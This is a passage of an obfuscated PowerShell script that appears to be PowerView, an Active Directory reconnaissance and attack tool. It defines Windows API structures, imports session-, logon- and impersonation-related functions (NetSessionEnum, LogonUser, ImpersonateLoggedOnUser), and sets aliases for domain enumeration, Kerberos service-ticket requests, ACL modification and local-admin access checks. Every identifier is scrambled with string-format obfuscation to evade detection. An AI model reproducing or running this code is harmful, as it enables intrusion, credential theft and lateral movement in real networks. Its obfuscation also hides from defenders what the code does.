    ("{0}{1}{2}{3}" -f 'NOT','_DEL','EGA','TED')                   =   1048576
    ("{1}{3}{2}{0}{4}"-f'_KEY','US','DES','E_','_ONLY')                =   2097152
    ("{2}{1}{0}{3}" -f'PR','T_REQ_','DON','EAUTH')                =   4194304
    ("{3}{2}{0}{1}"-f 'RD_EX','PIRED','SSWO','PA')                =   8388608
    ("{0}{7}{3}{5}{4}{2}{1}{6}" -f 'TR','O','_DELEGATI','O_A','R','UTH_FO','N','USTED_T')  =   16777216
    ("{0}{3}{2}{4}{1}{5}" -f'PAR','CC','ECRETS','TIAL_S','_A','OUNT')         =   67108864
} -Bitfield


${wts`cO`NN`eC`Tst`AtE} = &("{2}{0}{1}" -f 'senu','m','p') ${m`OD} ("{2}{5}{0}{3}{1}{4}" -f'STAT','C','WTS_','E_','LASS','CONNECT') ("{1}{0}{2}"-f'I','U','nt16') @{
    ("{0}{1}" -f 'Ac','tive')       =    0
    ("{3}{0}{2}{1}"-f 'onn','ed','ect','C')    =    1
    ("{0}{1}{3}{2}"-f 'C','onn','y','ectQuer') =    2
    ("{1}{0}{2}" -f'hado','S','w')       =    3
    ("{1}{3}{0}{2}" -f 'ecte','Di','d','sconn') =    4
    ("{0}{1}" -f 'Idl','e')         =    5
    ("{0}{1}"-f 'Liste','n')       =    6
    ("{0}{1}"-f 'Re','set')        =    7
    ("{1}{0}"-f'own','D')         =    8
    ("{0}{1}" -f'Ini','t')         =    9
}


${wts_SeS`Si`oN`_I`NFO_1} = &("{1}{0}"-f 't','struc') ${m`Od} ("{4}{1}{6}{3}{2}{5}{0}" -f'fo','o','I','.RDPSession','P','n','werView') @{
    ("{1}{2}{0}"-f 'nvId','Exec','E') = &("{1}{0}" -f 'ield','f') 0 ("{0}{1}"-f 'UInt','32')
    ("{1}{0}" -f 'tate','S') = &("{1}{0}"-f 'ld','fie') 1 ${wTSCo`N`NE`C`TstaTe}
    ("{0}{1}{2}"-f'Se','s','sionId') = &("{0}{1}" -f 'f','ield') 2 ("{2}{0}{1}"-f'In','t32','U')
    ("{3}{1}{2}{0}"-f'nName','i','o','pSess') = &("{0}{1}" -f'fi','eld') 3 ("{0}{1}"-f 'Strin','g') -MarshalAs @(("{0}{1}{2}" -f 'LPW','S','tr'))
    ("{1}{0}{2}" -f 'tNa','pHos','me') = &("{0}{1}"-f'fiel','d') 4 ("{1}{2}{0}"-f 'g','Str','in') -MarshalAs @(("{0}{1}" -f 'LP','WStr'))
    ("{1}{0}"-f'ame','pUserN') = &("{1}{0}"-f'ld','fie') 5 ("{1}{0}" -f 'ing','Str') -MarshalAs @(("{0}{1}" -f'LPWSt','r'))
    ("{2}{0}{1}"-f 'Domai','nName','p') = &("{1}{0}" -f 'd','fiel') 6 ("{0}{1}"-f 'Stri','ng') -MarshalAs @(("{2}{1}{0}"-f 'WStr','P','L'))
    ("{0}{1}"-f'pFar','mName') = &("{0}{1}" -f 'f','ield') 7 ("{0}{1}"-f'S','tring') -MarshalAs @(("{0}{1}{2}" -f'LPWS','t','r'))
}


${wTs_c`L`ienT`_a`DdRe`SS} = &("{1}{2}{0}" -f'uct','st','r') ${m`OD} ("{3}{2}{4}{1}{0}" -f 'SS','DRE','T','WTS_CLIEN','_AD') @{
    ("{1}{2}{0}" -f 'y','AddressFam','il') = &("{1}{0}"-f 'd','fiel') 0 ("{0}{1}{2}" -f 'UIn','t','32')
    ("{1}{0}"-f 's','Addres') = &("{0}{1}" -f'fie','ld') 1 ("{1}{0}" -f'te[]','By') -MarshalAs @(("{0}{1}{2}" -f'ByVa','lArra','y'), 20)
}


${SHa`RE`_InFo_1} = &("{1}{2}{0}"-f 'ct','str','u') ${M`Od} ("{3}{0}{4}{2}{1}" -f 'ie','Info','are','PowerV','w.Sh') @{
    ("{0}{1}"-f 'Na','me') = &("{1}{0}" -f 'ield','f') 0 ("{0}{1}"-f 'Str','ing') -MarshalAs @(("{0}{1}" -f 'LP','WStr'))
    ("{1}{0}" -f'e','Typ') = &("{1}{0}"-f'ield','f') 1 ("{0}{1}" -f'U','Int32')
    ("{0}{1}"-f'R','emark') = &("{0}{1}" -f 'fie','ld') 2 ("{2}{0}{1}" -f'ri','ng','St') -MarshalAs @(("{0}{1}" -f'LPWSt','r'))
}


${WKsta`_use`R_in`Fo_1} = &("{1}{0}"-f 'ruct','st') ${M`OD} ("{5}{3}{2}{0}{1}{4}" -f 'gedOn','UserIn','iew.Log','V','fo','Power') @{
    ("{1}{2}{0}"-f'e','U','serNam') = &("{1}{0}"-f'eld','fi') 0 ("{0}{1}"-f'Str','ing') -MarshalAs @(("{1}{0}{2}"-f'PW','L','Str'))
    ("{0}{1}{2}" -f 'Logon','Domai','n') = &("{0}{1}"-f 'fiel','d') 1 ("{1}{0}"-f 'ing','Str') -MarshalAs @(("{1}{0}{2}"-f 'PWS','L','tr'))
    ("{1}{0}{2}" -f 'D','Auth','omains') = &("{0}{1}" -f 'f','ield') 2 ("{1}{2}{0}" -f 'ing','St','r') -MarshalAs @(("{2}{1}{0}" -f 'WStr','P','L'))
    ("{2}{0}{1}"-f 'onServe','r','Log') = &("{0}{1}"-f 'fiel','d') 3 ("{0}{2}{1}" -f 'Str','ng','i') -MarshalAs @(("{1}{2}{0}" -f'tr','LP','WS'))
}


${sESs`Ion_`inF`O`_10} = &("{0}{1}"-f'stru','ct') ${M`oD} ("{3}{2}{0}{4}{1}" -f 'I','o','Session','PowerView.','nf') @{
    ("{1}{0}" -f 'ame','CN') = &("{1}{0}"-f 'ield','f') 0 ("{0}{1}"-f'St','ring') -MarshalAs @(("{0}{1}"-f 'LPW','Str'))
    ("{2}{1}{0}" -f'rName','e','Us') = &("{0}{1}" -f'f','ield') 1 ("{2}{0}{1}" -f 't','ring','S') -MarshalAs @(("{1}{0}"-f'PWStr','L'))
    ("{0}{1}" -f'Ti','me') = &("{0}{1}" -f 'fie','ld') 2 ("{0}{1}{2}"-f'U','In','t32')
    ("{2}{1}{0}"-f 'e','Tim','Idle') = &("{0}{1}" -f 'fi','eld') 3 ("{0}{1}" -f'UIn','t32')
}


${sId_`Na`mE`_u`se} = &("{0}{1}"-f 'psenu','m') ${m`oD} ("{1}{2}{3}{0}"-f 'E_USE','SI','D_N','AM') ("{0}{1}"-f 'UInt','16') @{
    ("{0}{2}{1}" -f 'S','er','idTypeUs')             = 1
    ("{1}{0}{2}{3}" -f'idTy','S','peGr','oup')            = 2
    ("{2}{0}{1}{3}" -f 'dType','D','Si','omain')           = 3
    ("{0}{1}{2}" -f 'S','idType','Alias')            = 4
    ("{2}{0}{3}{1}" -f 'eWellK','up','SidTyp','nownGro')   = 5
    ("{4}{2}{6}{5}{0}{3}{1}"-f 't','nt','T','edAccou','Sid','le','ypeDe')   = 6
    ("{3}{1}{2}{0}" -f'id','TypeInv','al','Sid')          = 7
    ("{3}{2}{1}{0}"-f'own','eUnkn','yp','SidT')          = 8
    ("{2}{1}{3}{0}" -f 'er','ypeCompu','SidT','t')         = 9
}


${lOCa`lGR`oU`p_InFo_1} = &("{0}{1}"-f 'str','uct') ${M`OD} ("{1}{0}{5}{3}{2}{4}"-f'OCA','L','_INF','UP','O_1','LGRO') @{
    ("{0}{2}{3}{1}"-f'lg','_name','rp','i1') = &("{0}{1}" -f'f','ield') 0 ("{0}{1}"-f'S','tring') -MarshalAs @(("{0}{1}" -f 'LPWSt','r'))
    ("{0}{3}{2}{1}{4}" -f'lg','en','comm','rpi1_','t') = &("{1}{0}" -f 'd','fiel') 1 ("{1}{0}"-f'g','Strin') -MarshalAs @(("{1}{0}{2}"-f'St','LPW','r'))
}


${Loca`lG`RouP`_MeMbE`Rs`_INFo_2} = &("{2}{0}{1}" -f't','ruct','s') ${M`oD} ("{1}{0}{4}{5}{3}{6}{2}" -f'LG','LOCA','NFO_2','_MEMB','R','OUP','ERS_I') @{
    ("{1}{0}{2}" -f 'grm','l','i2_sid') = &("{0}{1}" -f'f','ield') 0 ("{0}{1}"-f'I','ntPtr')
    ("{2}{1}{0}" -f'ge','rmi2_sidusa','lg') = &("{0}{1}"-f'f','ield') 1 ${S`Id`_NaME_U`se}
    ("{3}{0}{5}{2}{4}{1}"-f'2_d','name','ina','lgrmi','nd','oma') = &("{0}{1}"-f'fiel','d') 2 ("{1}{0}" -f 'ring','St') -MarshalAs @(("{1}{0}" -f 'PWStr','L'))
}


${DSd`om`AInfLaG} = &("{0}{1}"-f'ps','enum') ${m`OD} ("{1}{0}{2}" -f'.Fl','DsDomain','ags') ("{0}{1}"-f'UInt3','2') @{
    ("{2}{1}{0}"-f 'ST','FORE','IN_')       = 1
    ("{3}{2}{4}{0}{1}" -f 'N','D','CT_OUT','DIRE','BOU') = 2
    ("{1}{0}"-f'T','TREE_ROO')       = 4
    ("{0}{1}"-f 'PRI','MARY')         = 8
    ("{2}{3}{1}{0}" -f '_MODE','VE','NAT','I')     = 16
    ("{1}{0}{2}"-f 'ECT','DIR','_INBOUND')  = 32
} -Bitfield
${dsD`omaiNTr`U`stTYpe} = &("{2}{0}{1}" -f'se','num','p') ${M`od} ("{5}{0}{4}{3}{1}{2}" -f'a','u','stType','n.Tr','i','DsDom') ("{0}{1}"-f 'UInt3','2') @{
    ("{2}{0}{1}" -f 'L','EVEL','DOWN')   = 1
    ("{0}{1}{2}" -f 'U','PLEV','EL')     = 2
    ("{1}{0}"-f'T','MI')         = 3
    ("{1}{0}" -f'E','DC')         = 4
}
${DsD`oMAI`NTrU`Sta`T`TriBUt`ES} = &("{1}{0}"-f 'enum','ps') ${M`od} ("{6}{1}{3}{5}{4}{0}{2}"-f'stAttri','D','butes','o','ru','main.T','Ds') ("{2}{1}{0}" -f't32','n','UI') @{
    ("{1}{2}{0}"-f 'E','NON_TRANS','ITIV')      = 1
    ("{1}{0}{3}{2}" -f'PLEVEL_','U','Y','ONL')        = 2
    ("{0}{1}{3}{2}"-f'FIL','TER_','S','SID')         = 4
    ("{3}{0}{4}{2}{1}" -f'R','VE','TI','FO','EST_TRANSI')   = 8
    ("{1}{2}{3}{0}{5}{4}"-f'ATI','CROSS_ORGA','N','IZ','N','O')  = 16
    ("{2}{1}{3}{0}{4}" -f 'N_FO','IT','W','HI','REST')       = 32
    ("{3}{2}{1}{4}{5}{0}" -f 'RNAL','AS_EX','AT_','TRE','T','E')   = 64
}


${Ds_d`oMA`i`N_tRUS`TS} = &("{0}{1}"-f'st','ruct') ${m`OD} ("{3}{2}{1}{0}" -f'RUSTS','AIN_T','_DOM','DS') @{
    ("{3}{1}{0}{4}{2}"-f 'ainN','tbiosDom','e','Ne','am') = &("{1}{0}"-f 'd','fiel') 0 ("{0}{1}{2}"-f'S','tr','ing') -MarshalAs @(("{1}{0}" -f'tr','LPWS'))
    ("{0}{3}{1}{2}"-f'D','sDom','ainName','n') = &("{1}{0}" -f'd','fiel') 1 ("{1}{0}{2}"-f'tri','S','ng') -MarshalAs @(("{0}{1}" -f'LP','WStr'))
    ("{0}{1}" -f 'Fl','ags') = &("{1}{0}"-f 'd','fiel') 2 ${dSDOMa`I`NFL`AG}
    ("{0}{1}{2}" -f'P','a','rentIndex') = &("{1}{0}" -f'ld','fie') 3 ("{1}{0}" -f'Int32','U')
    ("{0}{1}{2}"-f 'Tru','stTy','pe') = &("{0}{1}" -f 'fiel','d') 4 ${d`SdOM`AiNtRusttY`pe}
    ("{3}{0}{1}{2}"-f'rust','A','ttributes','T') = &("{1}{0}"-f 'd','fiel') 5 ${d`sD`o`Ma`iNtRu`ST`ATTribUtES}
    ("{1}{0}"-f'd','DomainSi') = &("{0}{1}"-f'fiel','d') 6 ("{1}{0}"-f 'ntPtr','I')
    ("{1}{2}{0}"-f 'nGuid','Do','mai') = &("{0}{1}"-f 'f','ield') 7 ("{1}{0}"-f'd','Gui')
}


${NEt`R`esourC`Ew} = &("{1}{0}"-f'truct','s') ${M`Od} ("{2}{1}{0}{3}" -f'URCE','RESO','NET','W') @{
    ("{1}{0}"-f 'e','dwScop') =         &("{1}{0}" -f 'eld','fi') 0 ("{0}{1}" -f 'UInt','32')
    ("{1}{0}"-f 'e','dwTyp') =          &("{1}{0}" -f'ield','f') 1 ("{2}{0}{1}" -f'In','t32','U')
    ("{4}{2}{3}{1}{0}"-f 'pe','yTy','s','pla','dwDi') =   &("{1}{0}" -f'd','fiel') 2 ("{1}{0}" -f '32','UInt')
    ("{0}{1}"-f 'dwU','sage') =         &("{1}{0}"-f'd','fiel') 3 ("{0}{1}" -f 'UI','nt32')
    ("{1}{2}{0}" -f'Name','lpLoca','l') =     &("{1}{0}"-f'd','fiel') 4 ("{0}{1}"-f'Strin','g') -MarshalAs @(("{0}{1}" -f'LPW','Str'))
    ("{1}{0}{2}"-f 'eNa','lpRemot','me') =    &("{1}{0}" -f 'eld','fi') 5 ("{1}{0}{2}" -f'tri','S','ng') -MarshalAs @(("{1}{0}"-f'r','LPWSt'))
    ("{0}{2}{1}"-f'lpCo','nt','mme') =       &("{1}{0}"-f'ield','f') 6 ("{0}{1}"-f 'Strin','g') -MarshalAs @(("{1}{0}" -f 'Str','LPW'))
    ("{2}{1}{0}"-f 'der','i','lpProv') =      &("{1}{0}"-f'd','fiel') 7 ("{2}{1}{0}" -f 'g','trin','S') -MarshalAs @(("{0}{1}{2}"-f 'LP','W','Str'))
}


${fUnct`ionde`FI`Ni`TiO`NS} = @(
    (&("{0}{1}"-f'fun','c') ("{1}{0}{2}"-f'p','neta','i32') ("{1}{3}{0}{2}"-f 'Enu','Ne','m','tShare') ([Int]) @([String], [Int],   (Gi  ('v'+'AriAble'+':1v'+'4R')).vALuE.("{1}{4}{2}{0}{3}"-f'Typ','Ma','Ref','e','keBy').Invoke(), [Int],   $DlFA.("{3}{0}{2}{1}" -f 'ByR','fType','e','Make').Invoke(),   ( GeT-chiLDiTEM  VaRIAbLE:dLFa ).vALUE.("{1}{0}{2}"-f'a','M','keByRefType').Invoke(),  (cHILDITeM ('v'+'Ari'+'aB'+'lE:dlFa')).VALuE.("{2}{1}{0}{3}"-f'R','keBy','Ma','efType').Invoke())),
    (&("{1}{0}"-f'unc','f') ("{1}{0}{2}"-f'etap','n','i32') ("{1}{0}{4}{3}{2}" -f'Wk','Net','Enum','er','staUs') ([Int]) @([String], [Int],   (Get-VARiAbLE  1V4R ).vAlUe.("{3}{0}{2}{1}" -f 'yRefTy','e','p','MakeB').Invoke(), [Int],  ( vArIaBle  ("DlF"+"A") ).VAlUe.("{1}{0}{2}"-f 'By','Make','RefType').Invoke(),  (  VARIaBLE DLFA -VaLUeO ).("{0}{1}{2}" -f'MakeByR','efTy','pe').Invoke(),   (  vaRiABLE DLFa  ).vAlue.("{1}{2}{0}{3}"-f'ByRefTyp','Ma','ke','e').Invoke())),
    (&("{0}{1}"-f 'f','unc') ("{1}{0}{2}" -f 'pi','neta','32') ("{2}{3}{0}{1}" -f 'ssionE','num','N','etSe') ([Int]) @([String], [String], [String], [Int],  (  GeT-VAriABLE 1V4R  -vA ).("{4}{3}{2}{1}{0}" -f 'ype','T','f','eByRe','Mak').Invoke(), [Int],  $dlfa.("{0}{2}{4}{3}{1}"-f'Make','ype','B','efT','yR').Invoke(),  ( VArIaBle dLFa -vAl ).("{2}{0}{1}"-f'efTyp','e','MakeByR').Invoke(),  (ITEM VariaBLE:dlFa ).VAluE.("{3}{0}{2}{1}"-f 'akeB','RefType','y','M').Invoke())),
    (&("{0}{1}" -f'f','unc') ("{2}{0}{1}"-f'etap','i32','n') ("{1}{3}{0}{2}" -f 'Lo','Ne','calGroupEnum','t') ([Int]) @([String], [Int],  (GEt-iTem  ("VaRiABl"+"e:1"+"V"+"4r")).vAlUE.("{2}{0}{3}{1}"-f 'a','ByRefType','M','ke').Invoke(), [Int],   ( Get-VArIaBle  ("DL"+"Fa")  -vaLUeonly).("{0}{3}{2}{1}"-f'M','Type','Ref','akeBy').Invoke(),   ( gET-VArIAbLE ('dlf'+'A') -vAlUEonLY ).("{2}{1}{0}" -f 'Type','Ref','MakeBy').Invoke(),   (GeT-iteM  ("v"+"Ari"+"a"+"bLE:DlfA")).vaLuE.("{3}{2}{0}{1}" -f'e','fType','keByR','Ma').Invoke())),
    (&("{1}{0}" -f'nc','fu') ("{0}{1}{2}"-f'netap','i','32') ("{4}{3}{5}{6}{0}{2}{1}" -f 'em','rs','be','tLo','Ne','calG','roupGetM') ([Int]) @([String], [String], [Int],  $1V4r.("{0}{2}{1}{3}" -f'Ma','fTy','keByRe','pe').Invoke(), [Int],  $dLFA.("{2}{0}{3}{1}" -f'a','ype','M','keByRefT').Invoke(),   ( gci ("Var"+"Ia"+"BLe:DL"+"FA")).vALuE.("{2}{4}{1}{3}{0}"-f'e','RefTy','MakeB','p','y').Invoke(),   (  DIr  ('var'+'I'+'able:D'+'lFA')  ).vALuE.("{2}{0}{1}{4}{3}" -f'ByRe','fT','Make','pe','y').Invoke())),
    (&("{1}{0}"-f'unc','f') ("{1}{2}{0}" -f'pi32','ne','ta') ("{2}{1}{3}{0}" -f'Name','tS','DsGe','ite') ([Int]) @([String],   $1V4r.("{2}{1}{0}"-f'ByRefType','ake','M').Invoke())),
    (&("{0}{1}" -f 'fu','nc') ("{0}{1}{2}" -f'n','etap','i32') ("{3}{4}{5}{2}{0}{1}" -f 'mainT','rusts','Do','DsEnum','erat','e') ([Int]) @([String], [UInt32],   ( variAblE ("1V4"+"r")).VAlue.("{1}{3}{0}{2}"-f 'yR','M','efType','akeB').Invoke(),  $1v4r.("{1}{2}{0}" -f 'RefType','Mak','eBy').Invoke())),
    (&("{0}{1}"-f'fu','nc') ("{0}{1}" -f'netapi3','2') ("{4}{3}{0}{2}{1}" -f'B','e','ufferFre','i','NetAp') ([Int]) @([IntPtr])),
    (&("{1}{0}" -f 'nc','fu') ("{0}{1}{2}"-f 'advap','i3','2') ("{0}{2}{1}{6}{5}{4}{3}" -f'Co','t','nver','d','i','ingS','SidToStr') ([Int]) @([IntPtr],   (lS ("VaRI"+"abLE"+":915y")  ).vAlUe.("{2}{0}{1}" -f 'R','efType','MakeBy').Invoke()) -SetLastError),
    (&("{0}{1}" -f'fu','nc') ("{1}{0}"-f 'dvapi32','a') ("{3}{2}{0}{1}{4}"-f'n','a','Ma','OpenSC','gerW') ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (&("{0}{1}"-f 'fu','nc') ("{1}{0}{2}" -f'3','advapi','2') ("{3}{0}{2}{1}"-f 'iceH','ndle','a','CloseServ') ([Int]) @([IntPtr])),
    (&("{1}{0}" -f 'unc','f') ("{0}{1}" -f 'ad','vapi32') ("{0}{3}{1}{2}" -f 'Lo','se','r','gonU') ([Bool]) @([String], [String], [String], [UInt32], [UInt32],   (vaRIABLe 1V4r ).vALUE.("{3}{1}{2}{0}"-f'Type','ake','ByRef','M').Invoke()) -SetLastError),
    (&("{1}{0}"-f'nc','fu') ("{0}{2}{1}" -f'ad','api32','v') ("{2}{5}{0}{3}{4}{1}"-f 'rsona','er','Im','teLoggedOnU','s','pe') ([Bool]) @([IntPtr]) -SetLastError),
    (&("{1}{0}"-f 'nc','fu') ("{1}{0}" -f'32','advapi') ("{3}{0}{2}{1}" -f 'v','rtToSelf','e','Re') ([Bool]) @() -SetLastError),
    (&("{0}{1}" -f'f','unc') ("{0}{2}{1}"-f'wtsa','32','pi') ("{2}{0}{3}{1}"-f 'TS','ServerEx','W','Open') ([IntPtr]) @([String])),
    (&("{0}{1}"-f'fu','nc') ("{0}{1}" -f 'wtsapi3','2') ("{2}{0}{3}{4}{1}"-f 'TSEnume','x','W','rat','eSessionsE') ([Int]) @([IntPtr],   $DLFA.("{4}{3}{0}{1}{2}" -f 'keB','yRefTyp','e','a','M').Invoke(), [Int],  ( gEt-cHIlDITem variable:1v4R  ).VAlue.("{0}{1}{2}{3}"-f'Ma','k','e','ByRefType').Invoke(),   ( VaRiAbLE ('dL'+'FA') -VA  ).("{3}{4}{2}{0}{1}"-f 'ByRef','Type','ke','M','a').Invoke()) -SetLastError),
    (&("{0}{1}" -f 'fun','c') ("{0}{1}{2}" -f 'wt','sa','pi32') ("{1}{0}{3}{4}{8}{2}{5}{6}{7}"-f 'SQuery','WT','nInfo','S','e','rm','at','ion','ssio') ([Int]) @([IntPtr], [Int], [Int],  $1v4R.("{2}{1}{0}" -f 'fType','Re','MakeBy').Invoke(),   (lS VAriAbLe:DlFa  ).valuE.("{1}{0}{2}" -f 'ByRe','Make','fType').Invoke()) -SetLastError),
    (&("{0}{1}"-f'f','unc') ("{2}{1}{0}"-f '32','api','wts') ("{1}{4}{3}{0}{2}"-f'E','W','x','ory','TSFreeMem') ([Int]) @([Int32], [IntPtr], [Int32])),
    (&("{0}{1}" -f'f','unc') ("{2}{0}{1}"-f 'i','32','wtsap') ("{0}{1}{3}{2}"-f'WTSF','reeM','y','emor') ([Int]) @([IntPtr])),
    (&("{0}{1}" -f 'f','unc') ("{0}{1}{2}"-f 'wtsapi','3','2') ("{3}{1}{2}{0}"-f'ver','TSCloseS','er','W') ([Int]) @([IntPtr])),
    (&("{0}{1}" -f'fun','c') ("{0}{1}" -f 'M','pr') ("{0}{2}{1}{3}"-f'WNetAddCo','2','nnection','W') ([Int]) @(${nETrE`So`Ur`c`eW}, [String], [String], [UInt32])),
    (&("{0}{1}"-f 'fu','nc') ("{0}{1}" -f'M','pr') ("{3}{2}{0}{1}"-f 'nnecti','on2','NetCancelCo','W') ([Int]) @([String], [Int], [Bool])),
    (&("{0}{1}" -f'f','unc') ("{0}{1}{2}"-f 'ker','nel3','2') ("{3}{1}{0}{2}" -f 'n','Ha','dle','Close') ([Bool]) @([IntPtr]) -SetLastError)
)

${TyP`es} = ${FUnCtiO`ND`ef`InI`T`iONS} | &("{0}{1}{2}{3}"-f 'Add-','W','in','32Type') -Module ${M`OD} -Namespace ("{1}{0}"-f '32','Win')
${NE`TaPi32} = ${TY`p`Es}[("{2}{1}{0}" -f'2','tapi3','ne')]
${ADV`A`pi32} = ${T`Y`Pes}[("{1}{0}" -f 'i32','advap')]
${WTS`A`PI`32} = ${tYP`ES}[("{2}{1}{0}" -f 'i32','tsap','w')]
${M`Pr} = ${t`yPeS}['Mpr']
${KeRNel`32} = ${tYP`es}[("{1}{2}{0}" -f '32','ke','rnel')]

&("{0}{1}" -f 'Se','t-Alias') ("{0}{1}{3}{2}"-f 'Ge','t','IPAddress','-') ("{3}{0}{1}{2}" -f'olv','e-IPAddre','ss','Res')
&("{0}{1}{2}" -f'Set-Al','ia','s') ("{3}{2}{4}{1}{0}{5}" -f 'Si','To','vert-Nam','Con','e','d') ("{0}{3}{2}{1}" -f'C','ertTo-SID','nv','o')
&("{1}{0}"-f'ias','Set-Al') ("{0}{3}{2}{1}{4}"-f'Co','idToNam','rt-S','nve','e') ("{2}{4}{1}{0}{3}"-f'Fr','rt','C','om-SID','onve')
&("{2}{1}{0}"-f'as','et-Ali','S') ("{1}{0}{3}{2}"-f'st-','Reque','cket','SPNTi') ("{4}{3}{1}{2}{0}"-f 't','-Dom','ainSPNTicke','t','Ge')
&("{2}{1}{0}"-f '-Alias','t','Se') ("{0}{3}{2}{1}"-f'Get-DNSZ','e','n','o') ("{1}{3}{0}{2}" -f 'o','Get-Domai','ne','nDNSZ')
&("{1}{2}{0}" -f'as','Set','-Ali') ("{3}{2}{0}{4}{1}"-f 'Reco','d','DNS','Get-','r') ("{0}{3}{2}{4}{1}"-f'Get-Doma','d','NSReco','inD','r')
&("{2}{0}{1}" -f't','-Alias','Se') ("{0}{1}{2}"-f'Ge','t-NetDo','main') ("{1}{2}{0}{3}"-f'i','Get-D','oma','n')
&("{1}{2}{0}" -f 'Alias','Se','t-') ("{5}{7}{2}{4}{6}{0}{3}{1}"-f'C','er','-Ne','ontroll','tDom','G','ain','et') ("{0}{3}{4}{1}{2}" -f'Get-','ntrol','ler','Do','mainCo')
&("{2}{0}{1}" -f '-','Alias','Set') ("{1}{2}{0}"-f 'est','Get-','NetFor') ("{1}{0}{2}"-f 'Fo','Get-','rest')
&("{1}{0}{2}" -f'A','Set-','lias') ("{2}{3}{1}{0}{4}" -f 'Do','rest','Get-Ne','tFo','main') ("{4}{1}{0}{3}{2}" -f 'o','et-F','ain','restDom','G')
&("{0}{1}{2}"-f 'S','e','t-Alias') ("{4}{3}{2}{0}{1}" -f'Fo','restCatalog','t','t-Ne','Ge') ("{4}{2}{5}{1}{3}{0}"-f 'log','G','et-Fo','lobalCata','G','rest')
&("{1}{0}{2}" -f 'Alia','Set-','s') ("{1}{2}{0}"-f 'tUser','Get','-Ne') ("{0}{1}{3}{2}" -f 'Get-D','om','r','ainUse')
&("{2}{1}{0}" -f'ias','-Al','Set') ("{2}{3}{1}{0}"-f'vent','E','Ge','t-User') ("{2}{3}{1}{0}"-f 'UserEvent','main','Get-D','o')
&("{1}{0}{2}"-f'l','Set-A','ias') ("{0}{3}{1}{2}" -f 'Get','Ne','tComputer','-') ("{2}{1}{0}{3}" -f 'ute','mp','Get-DomainCo','r')
&("{1}{0}{2}"-f 'et','S','-Alias') ("{0}{2}{1}"-f 'Get-ADO','ct','bje') ("{0}{3}{1}{2}" -f 'Get-Do','ai','nObject','m')
&("{2}{1}{0}"-f's','-Alia','Set') ("{2}{1}{0}"-f'Object','et-AD','S') ("{0}{1}{2}{3}"-f 'Set-D','om','ainO','bject')
&("{2}{1}{0}" -f'ias','-Al','Set') ("{0}{2}{1}"-f'Get-Ob','tAcl','jec') ("{1}{0}{3}{4}{2}" -f 'e','G','nObjectAcl','t-Dom','ai')
&("{1}{2}{0}" -f'lias','Set-','A') ("{0}{2}{1}" -f 'A','ectAcl','dd-Obj') ("{2}{0}{5}{1}{3}{4}"-f'd-D','inObje','Ad','ctAc','l','oma')
&("{0}{1}" -f'Set-Alia','s') ("{2}{0}{1}{4}{3}{5}" -f'nvoke-ACLSc','a','I','n','n','er') ("{6}{3}{4}{5}{1}{0}{2}"-f'nAc','tingDomai','l','nd-I','nte','res','Fi')
&("{1}{2}{0}"-f'lias','Set-','A') ("{0}{2}{3}{1}"-f 'Get','p','-GUI','DMa') ("{2}{3}{0}{1}"-f 'mainGUIDM','ap','Ge','t-Do')
&("{2}{1}{0}"-f'ias','-Al','Set') ("{0}{1}"-f 'Get-Net','OU') ("{1}{2}{3}{0}" -f 'DomainOU','G','e','t-')
&("{1}{0}" -f's','Set-Alia') ("{0}{2}{1}"-f 'Get-Ne','te','tSi') ("{1}{2}{0}" -f'te','Get','-DomainSi')
&("{1}{0}{2}" -f'et-Al','S','ias') ("{1}{3}{0}{2}"-f'e','Get-NetSu','t','bn') ("{3}{0}{2}{1}{4}" -f'Domai','ubn','nS','Get-','et')
&("{0}{1}{2}"-f 'S','et-Ali','as') ("{2}{1}{3}{0}" -f 'roup','t-Net','Ge','G') ("{2}{3}{1}{4}{0}" -f 'up','nG','Get-Doma','i','ro')
&("{2}{0}{1}" -f'-Al','ias','Set') ("{1}{4}{6}{0}{3}{7}{2}{5}" -f'd','Find-Mana','r','Sec','g','ityGroups','e','u') ("{4}{6}{1}{3}{2}{0}{5}"-f 'tyGrou','agedSecu','i','r','Get-DomainM','p','an')
&("{2}{1}{0}"-f'ias','et-Al','S') ("{3}{1}{0}{2}" -f'tGroupM','t-Ne','ember','Ge') ("{4}{2}{1}{0}{5}{3}"-f'ou','nGr','ai','mber','Get-Dom','pMe')
&("{2}{1}{0}"-f 's','a','Set-Ali') ("{2}{1}{0}{3}"-f'ileServe','F','Get-Net','r') ("{4}{3}{2}{1}{0}" -f'erver','S','File','t-Domain','Ge')
&("{1}{0}{2}" -f 'Ali','Set-','as') ("{2}{0}{1}"-f't-D','FSshare','Ge') ("{1}{2}{3}{0}" -f 'are','Get-D','omainD','FSSh')
&("{1}{2}{0}"-f 'lias','S','et-A') ("{2}{1}{0}"-f'PO','NetG','Get-') ("{1}{2}{0}" -f 'GPO','Get-','Domain')
&("{2}{1}{0}" -f't-Alias','e','S') ("{1}{3}{4}{2}{0}"-f 'up','Get','o','-N','etGPOGr') ("{1}{2}{0}{3}{4}{5}" -f'o','Get','-D','mainGPOLoca','lGr','oup')
&("{1}{2}{0}" -f 'ias','Set','-Al') ("{0}{2}{3}{1}" -f'Fin','ation','d-GP','OLoc') ("{2}{3}{4}{1}{0}{5}"-f 'up','ro','Get-DomainGP','OUs','erLocalG','Mapping')
&("{1}{2}{0}"-f'-Alias','Se','t') ("{3}{4}{1}{0}{5}{2}" -f'omput','nd-GPOC','in','F','i','erAdm') ("{1}{6}{0}{4}{3}{5}{2}"-f 'er','Get-Domain','g','oupMapp','LocalGr','in','GPOComput')
&("{0}{1}{2}"-f 'S','et-A','lias') ("{2}{1}{0}{3}{5}{4}"-f'g','t-Lo','Ge','gedOnL','cal','o') ("{2}{3}{1}{0}"-f'n','LoggedO','Get-Re','g')
&("{1}{2}{0}"-f'as','Se','t-Ali') ("{2}{4}{6}{1}{5}{3}{7}{0}"-f 's','a','Invoke-','cce','CheckL','lAdminA','oc','s') ("{0}{2}{3}{1}"-f'Te','ccess','st-Admin','A')
&("{2}{1}{0}"-f '-Alias','et','S') ("{1}{0}{3}{2}" -f'e','G','SiteName','t-') ("{1}{2}{0}{3}" -f 'erSiteN','Get-NetCo','mput','ame')
&("{2}{3}{0}{1}" -f 'Al','ias','Se','t-') ("{2}{1}{0}" -f'oxy','et-Pr','G') ("{2}{1}{0}"-f 'oxy','MIRegPr','Get-W')
&("{1}{2}{0}"-f'as','Set-Al','i') ("{1}{2}{3}{4}{0}{5}"-f'gge','G','et','-','LastLo','dOn') ("{3}{4}{1}{0}{2}"-f 'gedO','astLog','n','Get-','WMIRegL')
